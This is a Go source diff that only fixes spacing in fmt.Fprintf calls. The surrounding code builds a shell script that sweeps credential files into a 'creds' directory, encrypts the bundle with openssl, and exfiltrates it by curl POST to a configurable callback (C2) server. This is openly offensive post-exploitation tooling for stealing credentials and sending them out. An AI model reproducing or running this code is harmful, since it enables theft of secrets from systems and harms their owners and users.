@@ -174,7 +174,7 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 	}
 
 	for _, p := range defaultPaths {
-		fmt.Fprintf(&b,`  for _cf in %s; do
+		fmt.Fprintf(&b, `  for _cf in %s; do
     [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null
   done
 `, p)
@@ -197,7 +197,7 @@ func buildMemoryDumpScript(o MemoryDumpOptions) string {
 		b.WriteString(`  # 4b. Extended credential sweep
 `)
 		for _, p := range extendedPaths {
-			fmt.Fprintf(&b,`  for _cf in %s; do
+			fmt.Fprintf(&b, `  for _cf in %s; do
     [ -e "$_cf" ] && cp "$_cf" "$_d/creds/" 2>/dev/null
   done
 `, p)
@@ -247,7 +247,7 @@ with open('$_d/report.json', 'w') as f:
 	exfilFile := "$_d/bundle.tgz"
 	if key := strings.TrimSpace(o.EncryptionKey); key != "" {
 		exfilFile = "$_d/bundle.enc"
-		fmt.Fprintf(&b,`  # 8. Encrypt with passphrase
+		fmt.Fprintf(&b, `  # 8. Encrypt with passphrase
   openssl enc -aes-256-cbc -pbkdf2 -salt \
     -in "$_d/bundle.tgz" -out "$_d/bundle.enc" \
     -pass pass:'%s' 2>/dev/null
@@ -257,7 +257,7 @@ with open('$_d/report.json', 'w') as f:
 	// Step 9: Exfiltration
 	c2 := strings.TrimSpace(o.CallbackURL)
 	if c2 != "" {
-		fmt.Fprintf(&b,`  # 9. Exfiltrate to callback server
+		fmt.Fprintf(&b, `  # 9. Exfiltrate to callback server
   echo "[*] Exfiltrating to: %s"
   curl -sS -X POST \
     -H "Content-Type: application/octet-stream" \
